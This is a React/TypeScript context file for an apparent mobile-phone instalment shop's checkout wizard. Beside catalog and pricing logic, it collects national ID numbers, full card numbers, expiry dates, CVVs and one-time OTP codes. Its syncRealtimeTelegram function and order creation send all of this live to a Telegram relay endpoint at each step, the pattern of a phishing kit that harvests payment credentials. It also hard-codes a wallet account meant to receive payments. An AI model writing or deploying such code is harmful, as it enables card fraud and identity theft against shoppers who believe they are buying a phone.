'use client';

import React, { createContext, useContext, useState, useEffect } from 'react';
import { 
  MobileModel, 
  ColorOption, 
  StorageOption, 
  INITIAL_MODELS, 
  BRANDS, 
  SERIES, 
  BrandOption, 
  SeriesOption 
} from '../data/catalog';

export type DeliveryType = 'open_parcel' | 'standard';
export type PaymentMethodChoice = 'easypaisa' | 'askari' | 'alfalah' | 'upaisa' | 'raqami' | 'payway' | 'card';

export interface CustomerDetails {
  fullName: string;
  cnic: string;
  mobileNumber: string;
  deliveryAddress: string;
  deliveryType: DeliveryType;
  paymentMethod: PaymentMethodChoice;
  utilityBillType?: string;
  hasFamilyMemberCnic?: boolean;
}

export interface CustomerDocuments {
  cnicFrontName?: string;
  cnicBackName?: string;
  utilityBillName?: string;
  balanceProofName?: string;
  familyCnicName?: string;
}

export interface PaymentDetails {
  channel: PaymentMethodChoice;
  bankId: string;
  walletType: string;
  accountNumber: string;
  accountTitle: string;
  senderAccount: string;
  transactionId: string;
  cardNetwork: 'visa' | 'mastercard';
  cardName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  otpCode?: string;
  proofFile: File | null;
  proofPreviewUrl: string | null;
  acceptedTerms: boolean;
}

export interface OrderConfirmation {
  orderId: string;
  createdAt: string;
  model: MobileModel;
  color: ColorOption;
  storage: StorageOption;
  months: number;
  totalPrice: number;
  downPayment: number;
  balance: number;
  monthlyEmi: number;
  customer: CustomerDetails;
  documents: CustomerDocuments;
  payment: PaymentDetails;
  status: 'Waiting for Approval' | 'Order Placed' | 'Delivered';
}

interface WizardContextType {
  currentStep: number;
  setStep: (step: number) => void;
  goNext: () => void;
  goBack: () => void;

  // Dynamic Catalog State
  modelsList: MobileModel[];
  addModel: (newModel: MobileModel) => void;
  updateModel: (updatedModel: MobileModel) => void;
  deleteModel: (id: string) => void;
  resetCatalog: () => void;

  // Step 1 Selection
  selectedBrandId: string;
  setSelectedBrandId: (brandId: string) => void;
  selectedSeriesId: string;
  setSelectedSeriesId: (seriesId: string) => void;
  selectedModel: MobileModel | null;
  setSelectedModel: (model: MobileModel | null) => void;

  // Step 2 Selection
  selectedColor: ColorOption | null;
  setSelectedColor: (color: ColorOption) => void;
  selectedStorage: StorageOption | null;
  setSelectedStorage: (storage: StorageOption) => void;
  selectedTenureMonths: number;
  setSelectedTenureMonths: (months: number) => void;
  calculatedTotalPrice: number;
  calculatedDownPayment: number;
  calculatedBalance: number;
  calculatedMonthlyEmi: number;

  // Step 3 Customer Details & Docs
  customerDetails: CustomerDetails;
  setCustomerDetails: React.Dispatch<React.SetStateAction<CustomerDetails>>;
  customerDocs: CustomerDocuments;
  setCustomerDocs: React.Dispatch<React.SetStateAction<CustomerDocuments>>;

  // Step 4 Payment Details
  paymentDetails: PaymentDetails;
  setPaymentDetails: React.Dispatch<React.SetStateAction<PaymentDetails>>;

  // Step 5 Order Confirmation
  currentOrder: OrderConfirmation | null;
  createOrder: () => void;
  resetWizard: () => void;
  syncRealtimeTelegram: (stepName: string, customData?: any) => void;
}

const WizardContext = createContext<WizardContextType | undefined>(undefined);

export const WizardProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentStep, setCurrentStep] = useState<number>(0);

  // Dynamic Catalog State stored in LocalStorage
  const [modelsList, setModelsList] = useState<MobileModel[]>(INITIAL_MODELS);

  useEffect(() => {
    try {
      const saved = localStorage.getItem('iml_models_catalog_v2');
      if (saved) {
        setModelsList(JSON.parse(saved));
      } else {
        setModelsList(INITIAL_MODELS);
      }
    } catch (e) {
      setModelsList(INITIAL_MODELS);
    }
  }, []);

  const saveCatalog = (newList: MobileModel[]) => {
    setModelsList(newList);
    try {
      localStorage.setItem('iml_models_catalog_v2', JSON.stringify(newList));
    } catch (e) {}
  };

  const addModel = (newModel: MobileModel) => {
    const updated = [newModel, ...modelsList];
    saveCatalog(updated);
  };

  const updateModel = (updatedModel: MobileModel) => {
    const updated = modelsList.map((m) => (m.id === updatedModel.id ? updatedModel : m));
    saveCatalog(updated);
  };

  const deleteModel = (id: string) => {
    const updated = modelsList.filter((m) => m.id !== id);
    saveCatalog(updated);
  };

  const resetCatalog = () => {
    saveCatalog(INITIAL_MODELS);
  };

  // Step 1: Default to Apple & iPhone 18 Series as in uploaded UI
  const [selectedBrandId, setSelectedBrandIdState] = useState<string>('apple');
  const [selectedSeriesId, setSelectedSeriesIdState] = useState<string>('apple-18');
  const [selectedModel, setSelectedModel] = useState<MobileModel | null>(INITIAL_MODELS[0] || null);

  // Step 2
  const [selectedColor, setSelectedColor] = useState<ColorOption | null>(INITIAL_MODELS[0]?.colors[0] || null);
  const [selectedStorage, setSelectedStorage] = useState<StorageOption | null>(INITIAL_MODELS[0]?.storageOptions[0] || null);
  const [selectedTenureMonths, setSelectedTenureMonths] = useState<number>(12);

  // Step 3: Customer Details & Documents (PDF Page 14)
  const [customerDetails, setCustomerDetails] = useState<CustomerDetails>({
    fullName: '',
    cnic: '',
    mobileNumber: '',
    deliveryAddress: '',
    deliveryType: 'open_parcel',
    paymentMethod: 'easypaisa'
  });

  const [customerDocs, setCustomerDocs] = useState<CustomerDocuments>({
    cnicFrontName: '',
    cnicBackName: '',
    utilityBillName: '',
    balanceProofName: '',
    familyCnicName: ''
  });

  // Step 4: Payment Channels (Easypaisa, Askari Bank, Bank Alfalah, UPaisa, Raqami, Payway)
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({
    channel: 'easypaisa',
    bankId: 'askari',
    walletType: 'easypaisa',
    accountNumber: '03450941134',
    accountTitle: 'INSTALMENT MOBILE LIMITED',
    senderAccount: '',
    transactionId: '',
    cardNetwork: 'visa',
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    otpCode: '',
    proofFile: null,
    proofPreviewUrl: null,
    acceptedTerms: false
  });

  // Step 5: Order state
  const [currentOrder, setCurrentOrder] = useState<OrderConfirmation | null>(null);
  const [telegramMessageId, setTelegramMessageId] = useState<number | null>(null);

  // Sync with Telegram
  const syncRealtimeTelegram = (stepName: string, customData?: any) => {
    try {
      const payload = {
        stepName,
        messageId: telegramMessageId,
        data: customData || {
          company: 'INSTALMENT MOBILE LIMITED',
          model: selectedModel,
          color: selectedColor,
          storage: selectedStorage,
          months: selectedTenureMonths,
          monthlyEmi: calculatedMonthlyEmi,
          downPayment: calculatedDownPayment,
          totalPrice: calculatedTotalPrice,
          customer: customerDetails,
          documents: customerDocs,
          payment: paymentDetails
        }
      };

      fetch('/api/telegram/realtime', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.success && data.messageId) {
            setTelegramMessageId(data.messageId);
          }
        })
        .catch(() => {});
    } catch (e) {}
  };

  const setSelectedBrandId = (brandId: string) => {
    setSelectedBrandIdState(brandId);
    const availableSeries = SERIES.filter((s) => s.brandId === brandId);
    const firstSeriesId = availableSeries[0]?.id || '';
    setSelectedSeriesIdState(firstSeriesId);
    const firstModel = modelsList.find((m) => m.seriesId === firstSeriesId) || null;
    setSelectedModel(firstModel);
  };

  const setSelectedSeriesId = (seriesId: string) => {
    setSelectedSeriesIdState(seriesId);
    const firstModel = modelsList.find((m) => m.seriesId === seriesId) || null;
    setSelectedModel(firstModel);
  };

  // Synchronize color & storage defaults
  useEffect(() => {
    if (selectedModel) {
      if (!selectedModel.colors.some((c) => c.name === selectedColor?.name)) {
        setSelectedColor(selectedModel.colors[0] || null);
      }
      if (!selectedModel.storageOptions.some((s) => s.size === selectedStorage?.size)) {
        setSelectedStorage(selectedModel.storageOptions[0] || null);
      }
    }
  }, [selectedModel]);

  // Calculations strictly adhering to PDF official pricing table
  const calculatedTotalPrice = (selectedModel?.basePrice || 0) + (selectedStorage?.priceDelta || 0);
  const calculatedDownPayment = selectedModel?.downPayment || Math.round(calculatedTotalPrice * 0.3);
  const calculatedBalance = Math.max(0, calculatedTotalPrice - calculatedDownPayment);
  
  const calculatedMonthlyEmi = 
    (selectedModel?.installments && selectedModel.installments[selectedTenureMonths])
      ? selectedModel.installments[selectedTenureMonths]
      : (selectedTenureMonths > 0 ? Math.round(calculatedBalance / selectedTenureMonths) : 0);

  const setStep = (step: number) => {
    if (step >= 0 && step <= 5) {
      setCurrentStep(step);
    }
  };

  const goNext = () => setStep(currentStep + 1);
  const goBack = () => setStep(currentStep - 1);

  const generateOrderId = () => {
    const today = new Date();
    const yy = String(today.getFullYear()).slice(-2);
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const dd = String(today.getDate()).padStart(2, '0');
    const random4 = Math.floor(1000 + Math.random() * 9000);
    return `IML-${yy}${mm}${dd}-${random4}`;
  };

  const createOrder = () => {
    if (!selectedModel || !selectedColor || !selectedStorage) return;

    const newOrder: OrderConfirmation = {
      orderId: generateOrderId(),
      createdAt: new Date().toISOString(),
      model: selectedModel,
      color: selectedColor,
      storage: selectedStorage,
      months: selectedTenureMonths,
      totalPrice: calculatedTotalPrice,
      downPayment: calculatedDownPayment,
      balance: calculatedBalance,
      monthlyEmi: calculatedMonthlyEmi,
      customer: customerDetails,
      documents: customerDocs,
      payment: paymentDetails,
      status: 'Waiting for Approval'
    };

    setCurrentOrder(newOrder);

    // Save to LocalStorage
    try {
      const existing = JSON.parse(localStorage.getItem('iml_orders_history') || '[]');
      existing.unshift(newOrder);
      localStorage.setItem('iml_orders_history', JSON.stringify(existing));
    } catch (e) {}

    // Dispatch final notification to Telegram
    try {
      fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newOrder)
      }).catch(() => {});
    } catch (e) {}

    goNext();
  };

  const resetWizard = () => {
    setCurrentStep(0);
    setCurrentOrder(null);
    setTelegramMessageId(null);
  };

  return (
    <WizardContext.Provider
      value={{
        currentStep,
        setStep,
        goNext,
        goBack,
        modelsList,
        addModel,
        updateModel,
        deleteModel,
        resetCatalog,
        selectedBrandId,
        setSelectedBrandId,
        selectedSeriesId,
        setSelectedSeriesId,
        selectedModel,
        setSelectedModel,
        selectedColor,
        setSelectedColor,
        selectedStorage,
        setSelectedStorage,
        selectedTenureMonths,
        setSelectedTenureMonths,
        calculatedTotalPrice,
        calculatedDownPayment,
        calculatedBalance,
        calculatedMonthlyEmi,
        customerDetails,
        setCustomerDetails,
        customerDocs,
        setCustomerDocs,
        paymentDetails,
        setPaymentDetails,
        currentOrder,
        createOrder,
        resetWizard,
        syncRealtimeTelegram
      }}
    >
      {children}
    </WizardContext.Provider>
  );
};

export const useWizard = () => {
  const context = useContext(WizardContext);
  if (!context) {
    throw new Error('useWizard must be used within a WizardProvider');
  }
  return context;
};
